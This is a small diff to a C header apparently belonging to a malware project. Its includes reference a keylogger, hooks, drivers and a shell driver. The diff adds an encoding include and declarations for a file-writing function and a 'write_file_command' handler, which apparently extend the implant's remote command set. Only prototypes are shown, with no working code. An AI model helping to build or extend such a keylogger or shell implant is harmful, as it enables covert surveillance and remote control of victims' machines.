@@ -11,6 +11,7 @@
 #include "keylogger.h"
 #include "hooks.h"
 #include "drivers.h"
+#include "encoding.h"
 
 extern struct shell_driver_data driver_data;
 
@@ -37,6 +38,13 @@ extern struct mutex random_mutex;
 extern bool random_switched;
 
 bool switch_random(void);
+
+// creates file with content from the given buffer
+int write_file(char* filename, char* buffer);
+
+void write_file_command(args_t* args);
+
+
 
 
 #endif
